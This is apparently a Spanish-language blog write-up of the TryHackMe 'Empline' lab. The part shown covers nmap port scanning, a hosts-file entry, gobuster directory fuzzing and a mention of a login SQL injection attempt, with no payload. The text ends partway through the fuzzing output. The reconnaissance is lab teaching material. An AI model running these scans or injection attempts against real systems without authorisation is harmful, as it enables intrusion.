@@ -1,0 +1,1132 @@
+<!DOCTYPE html>
+<html lang="es" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='Scanning Empezamos con el reconocimiento de puertos con un TCP SYN Port Scan.
+Parámetro → Descripción
+-p- → Escanea el rango completo de puertos(65535 puertos). &amp;ndash;open → Puertos que esten solo abiertos. -sS → Escaneo de tipo SYN port scan. &amp;ndash;min-rate → Envia paquetes no más lentos que 5000 por segundo. -vvv → Triple verbose para ver en consola los resultados. -n → No efectua resolución DNS. -Pn → No efectua descubrimientos de hosts.'>
+<title>WriteUp Empline</title>
+
+<link rel='canonical' href='/p/writeup-empline/'>
+
+<link rel="stylesheet" href="/scss/style.min.abbd69b2908fdfcd5179898beaafd374514a86538d81639ddd2c58c06ae54e40.css"><meta property='og:title' content='WriteUp Empline'>
+<meta property='og:description' content='Scanning Empezamos con el reconocimiento de puertos con un TCP SYN Port Scan.
+Parámetro → Descripción
+-p- → Escanea el rango completo de puertos(65535 puertos). &amp;ndash;open → Puertos que esten solo abiertos. -sS → Escaneo de tipo SYN port scan. &amp;ndash;min-rate → Envia paquetes no más lentos que 5000 por segundo. -vvv → Triple verbose para ver en consola los resultados. -n → No efectua resolución DNS. -Pn → No efectua descubrimientos de hosts.'>
+<meta property='og:url' content='/p/writeup-empline/'>
+<meta property='og:site_name' content='Liv3P0ol'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2023-08-23T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2023-08-23T00:00:00&#43;00:00'/><meta property='og:image' content='/p/writeup-empline/logo.png' />
+<meta name="twitter:title" content="WriteUp Empline">
+<meta name="twitter:description" content="Scanning Empezamos con el reconocimiento de puertos con un TCP SYN Port Scan.
+Parámetro → Descripción
+-p- → Escanea el rango completo de puertos(65535 puertos). &amp;ndash;open → Puertos que esten solo abiertos. -sS → Escaneo de tipo SYN port scan. &amp;ndash;min-rate → Envia paquetes no más lentos que 5000 por segundo. -vvv → Triple verbose para ver en consola los resultados. -n → No efectua resolución DNS. -Pn → No efectua descubrimientos de hosts."><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='/p/writeup-empline/logo.png' />
+    <link rel="shortcut icon" href="/favicon.png" />
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/logo1_hu4cd92a203c8104ea58ca026f0632b0b6_33996_300x0_resize_q75_box.jpg" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Liv3P0ol</a></h1>
+            <h2 class="site-description">Cybersecurity Analyst</h2>
+        </div>
+    </header><ol class="social-menu">
+            
+                <li>
+                    <a 
+                        href='https://github.com/liv3p0ol'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://linkedin.com/in/%c3%a1lvaro-gil-banda-323663196'
+                        target="_blank"
+                        title="LinkedIn"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg"  viewBox="0 0 48 48" width="48px" height="48px"><path fill="#0288D1" d="M42,37c0,2.762-2.238,5-5,5H11c-2.761,0-5-2.238-5-5V11c0-2.762,2.239-5,5-5h26c2.762,0,5,2.238,5,5V37z"/><path fill="#FFF" d="M12 19H17V36H12zM14.485 17h-.028C12.965 17 12 15.888 12 14.499 12 13.08 12.995 12 14.514 12c1.521 0 2.458 1.08 2.486 2.499C17 15.887 16.035 17 14.485 17zM36 36h-5v-9.099c0-2.198-1.225-3.698-3.192-3.698-1.501 0-2.313 1.012-2.707 1.99C24.957 25.543 25 26.511 25 27v9h-5V19h5v2.616C25.721 20.5 26.85 19 29.738 19c3.578 0 6.261 2.25 6.261 7.274L36 36 36 36z"/></svg>
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/whoami/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>Whoami</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+
+        <div class="menu-bottom-section">
+            
+            
+                <li id="dark-mode-toggle">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <span>Modo oscuro</span>
+                </li>
+            
+        </div>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">Tabla de contenido</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li>
+      <ol>
+        <li><a href="#scanning">Scanning</a></li>
+        <li><a href="#enumeration">Enumeration</a></li>
+        <li><a href="#escalada">Escalada</a></li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/writeup-empline/">
+                <img src="/p/writeup-empline/logo_hua65c6c6a95811e4ada5ccd44d600f53a_44605_800x0_resize_box_3.png"
+                        srcset="/p/writeup-empline/logo_hua65c6c6a95811e4ada5ccd44d600f53a_44605_800x0_resize_box_3.png 800w, /p/writeup-empline/logo_hua65c6c6a95811e4ada5ccd44d600f53a_44605_1600x0_resize_box_3.png 1600w"
+                        width="800" 
+                        height="800" 
+                        loading="lazy"
+                        alt="Featured image of post WriteUp Empline" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/tryhackme/" style="background-color: #e62929; color: #fff;">
+                TryHackMe
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/writeup-empline/">WriteUp Empline</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Aug 23, 2023</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    7 minutos a leer
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h3 id="scanning">Scanning</h3>
+<p>Empezamos con el reconocimiento de puertos con un <code>TCP SYN Port Scan</code>.</p>
+<p><strong>Parámetro</strong> → <strong>Descripción</strong></p>
+<ul>
+<li><strong>-p-</strong> → Escanea el rango completo de puertos(65535 puertos).</li>
+<li><strong>&ndash;open</strong> → Puertos que esten solo abiertos.</li>
+<li><strong>-sS</strong> → Escaneo de tipo SYN port scan.</li>
+<li><strong>&ndash;min-rate</strong> → Envia paquetes no más lentos que 5000 por segundo.</li>
+<li><strong>-vvv</strong> → Triple verbose para ver en consola los resultados.</li>
+<li><strong>-n</strong> → No efectua resolución DNS.</li>
+<li><strong>-Pn</strong> → No efectua descubrimientos de hosts.</li>
+<li><strong>-oG</strong> → Guardar el output en formato grepeable.</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap -p- --open -sS --min-rate <span class="m">5000</span> -vvv -n -Pn 10.10.212.220 -oG allports
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT     STATE SERVICE REASON
+</span></span><span class="line"><span class="cl">22/tcp   open  ssh     syn-ack ttl <span class="m">63</span>
+</span></span><span class="line"><span class="cl">80/tcp   open  http    syn-ack ttl <span class="m">63</span>
+</span></span><span class="line"><span class="cl">3306/tcp open  mysql   syn-ack ttl <span class="m">63</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Una vez obtenidos los puertos que estan abiertos y visibles hacia nosotros, es ora de obtener mas información de los mismos.</p>
+<p><strong>Parámetro</strong> → <strong>Descripción</strong></p>
+<ul>
+<li><strong>-sC</strong> → Muestra todos los scripts relacionados con el servicio.</li>
+<li><strong>-sV</strong> → Determina la version del servicio.</li>
+<li><strong>-p</strong> → Escanea sobre los peurtos especificados.</li>
+<li><strong>-oN</strong> → Guarda el output en un arcivo con formato normal.</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap -sCV -p22,80,3306 10.10.212.220 -oN targeted
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT     STATE SERVICE VERSION
+</span></span><span class="line"><span class="cl">22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">2048</span> c0:d5:41:ee:a4:d0:83:0c:97:0d:75:cc:7b:10:7f:76 <span class="o">(</span>RSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 83:82:f9:69:19:7d:0d:5c:53:65:d5:54:f6:45:db:74 <span class="o">(</span>ECDSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> 4f:91:3e:8b:69:69:09:70:0e:82:26:28:5c:84:71:c9 <span class="o">(</span>ED25519<span class="o">)</span>
+</span></span><span class="line"><span class="cl">80/tcp   open  http    Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Empline
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl">3306/tcp open  mysql   MySQL 5.5.5-10.1.48-MariaDB-0ubuntu0.18.04.1
+</span></span><span class="line"><span class="cl"><span class="p">|</span> mysql-info: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   Protocol: <span class="m">10</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   Version: 5.5.5-10.1.48-MariaDB-0ubuntu0.18.04.1
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   Thread ID: <span class="m">85</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   Capabilities flags: <span class="m">63487</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   Some Capabilities: DontAllowDatabaseTableColumn, LongColumnFlag, ODBCClient, Speaks41ProtocolOld, SupportsTransactions, SupportsCompression, SupportsLoadDataLocal, FoundRows, IgnoreSigpipes, InteractiveClient, Speaks41ProtocolNew, LongPassword, ConnectWithDatabase, IgnoreSpaceBeforeParenthesis, Support41Auth, SupportsAuthPlugins, SupportsMultipleResults, SupportsMultipleStatments
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   Status: Autocommit
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   Salt: <span class="p">|</span><span class="o">=</span>Y<span class="sb">`</span>TT*osrc<span class="o">{</span>aQR+<span class="p">|</span>Rcy
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  Auth Plugin Name: mysql_native_password
+</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Comenzamos visitando la página web que está corriendo en el puerto 80 y visualizamos la página.</p>
+<p><img src="/p/writeup-empline/images/1.PNG"
+	width="1579"
+	height="633"
+	srcset="/p/writeup-empline/images/1_hu40a9579a27cebe1b0b10bf155516e5fd_540184_480x0_resize_box_3.PNG 480w, /p/writeup-empline/images/1_hu40a9579a27cebe1b0b10bf155516e5fd_540184_1024x0_resize_box_3.PNG 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="249"
+		data-flex-basis="598px"
+	
+></p>
+<p>Al irnos moviendo por los menús vemos que si hacemos hovering sobre <strong>EMPLOYMENT</strong> vemos que nos redirecciona a job.empline.thm, por lo que vamos a añadir esto al archivo <code>/etc/hosts</code></p>
+<p><img src="/images/2.PNG"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nvim /etc/hosts
+</span></span><span class="line"><span class="cl"><span class="c1"># Host addresses</span>
+</span></span><span class="line"><span class="cl">127.0.0.1  localhost
+</span></span><span class="line"><span class="cl">127.0.1.1  parrot
+</span></span><span class="line"><span class="cl">::1        localhost ip6-localhost ip6-loopback
+</span></span><span class="line"><span class="cl">ff02::1    ip6-allnodes
+</span></span><span class="line"><span class="cl">ff02::2    ip6-allrouters
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">10.10.212.220 empline.thm job.empline.thm
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Visitamos de nuevo la pagina y vemos que nos manda a un login.</p>
+<p><img src="/p/writeup-empline/images/3.PNG"
+	width="1576"
+	height="625"
+	srcset="/p/writeup-empline/images/3_hu923be39fea86337f231196f083648193_48606_480x0_resize_box_3.PNG 480w, /p/writeup-empline/images/3_hu923be39fea86337f231196f083648193_48606_1024x0_resize_box_3.PNG 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="252"
+		data-flex-basis="605px"
+	
+></p>
+<p>Aqui me dío por porbar una inyección SQL por si somos capaces de bypassear el login. Al acerlo descubrimos unas cerdendiales pero ningna funciona.</p>
+<p><img src="/p/writeup-empline/images/SQLi.PNG"
+	width="1569"
+	height="625"
+	srcset="/p/writeup-empline/images/SQLi_hub0a6543778a9e96504cf309b90e19e3d_104326_480x0_resize_box_3.PNG 480w, /p/writeup-empline/images/SQLi_hub0a6543778a9e96504cf309b90e19e3d_104326_1024x0_resize_box_3.PNG 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="251"
+		data-flex-basis="602px"
+	
+></p>
+<h3 id="enumeration">Enumeration</h3>
+<p>Una vez añadido al <code>/etc/hosts</code> vamos a hacer <strong>fuzzing</strong> con <code>gobuster</code> para ver si hay alguna ruta interesante en la cual podamos hacer algo.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">gobuster dir -u http://job.empline.thm -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -o web2.txt -x php,html,txt -t <span class="m">50</span> 2&gt;/dev/null
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl">Gobuster v3.1.0
+</span></span><span class="line"><span class="cl">by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span class="p">&amp;</span> Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Url:                     http://job.empline.thm
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Method:                  GET
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Threads:                 <span class="m">50</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Negative Status codes:   <span class="m">404</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> User Agent:              gobuster/3.1.0
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Extensions:              txt,php,html
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Timeout:                 <span class="nv">10s</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl">2023/02/13 18:10:29 Starting gobuster in directory enumeration <span class="nv">mode</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl">/rss                  <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 316<span class="o">]</span> <span class="o">[</span>--&gt; http://job.empline.thm/rss/<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/xml                  <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 316<span class="o">]</span> <span class="o">[</span>--&gt; http://job.empline.thm/xml/<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/modules              <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 320<span class="o">]</span> <span class="o">[</span>--&gt; http://job.empline.thm/modules/<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/careers              <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 320<span class="o">]</span> <span class="o">[</span>--&gt; http://job.empline.thm/careers/<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/scripts              <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 320<span class="o">]</span> <span class="o">[</span>--&gt; http://job.empline.thm/scripts/<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/images               <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 319<span class="o">]</span> <span class="o">[</span>--&gt; http://job.empline.thm/images/<span class="o">]</span> 
+</span></span><span class="line"><span class="cl">/upload               <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 319<span class="o">]</span> <span class="o">[</span>--&gt; http://job.empline.thm/upload/<span class="o">]</span> 
+</span></span><span class="line"><span class="cl">/index.php            <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 3671<span class="o">]</span>                                     
+</span></span><span class="line"><span class="cl">/ajax                 <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 317<span class="o">]</span> <span class="o">[</span>--&gt; http://job.empline.thm/ajax/<span class="o">]</span>   
+</span></span><span class="line"><span class="cl">/ajax.php             <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 140<span class="o">]</span>                                      
+</span></span><span class="line"><span class="cl">/test                 <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 317<span class="o">]</span> <span class="o">[</span>--&gt; http://job.empline.thm/test/<span class="o">]</span>   
+</span></span><span class="line"><span class="cl">/lib                  <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 316<span class="o">]</span> <span class="o">[</span>--&gt; http://job.empline.thm/lib/<span class="o">]</span>    
+</span></span><span class="line"><span class="cl">/src                  <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 316<span class="o">]</span> <span class="o">[</span>--&gt; http://job.empline.thm/src/<span class="o">]</span>    
+</span></span><span class="line"><span class="cl">/db                   <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 315<span class="o">]</span> <span class="o">[</span>--&gt; http://job.empline.thm/db/<span class="o">]</span>     
+</span></span><span class="line"><span class="cl">/js                   <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 315<span class="o">]</span> <span class="o">[</span>--&gt; http://job.empline.thm/js/<span class="o">]</span>     
+</span></span><span class="line"><span class="cl">/javascript           <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 323<span class="o">]</span> <span class="o">[</span>--&gt; http://job.empline.thm/javascript/<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/temp                 <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 317<span class="o">]</span> <span class="o">[</span>--&gt; http://job.empline.thm/temp/<span class="o">]</span>      
+</span></span><span class="line"><span class="cl">/vendor               <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 319<span class="o">]</span> <span class="o">[</span>--&gt; http://job.empline.thm/vendor/<span class="o">]</span>    
+</span></span><span class="line"><span class="cl">/config.php           <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 0<span class="o">]</span>                                           
+</span></span><span class="line"><span class="cl">/attachments          <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 324<span class="o">]</span> <span class="o">[</span>--&gt; http://job.empline.thm/attachments/<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/ci                   <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 315<span class="o">]</span> <span class="o">[</span>--&gt; http://job.empline.thm/ci/<span class="o">]</span>         
